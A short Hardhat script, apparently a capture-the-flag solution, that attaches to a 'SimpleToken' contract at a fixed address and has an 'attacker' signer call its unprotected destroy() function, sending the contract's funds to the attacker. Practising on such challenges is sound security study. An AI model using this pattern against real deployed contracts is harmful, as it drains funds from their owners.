import { ethers } from "hardhat";

const CONTRACT_NAME = "SimpleToken";
const CONTRACT_ADDRESS = "0x12bf6bfebbda5fca03906a83425bcea6e2614c73";

async function main() {
  const [attacker] = await ethers.getSigners()

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const tx = await contract.destroy(attacker.address)
  await tx.wait()

}

main().catch(error => {
  console.error(error);
  process.exit(1);
});
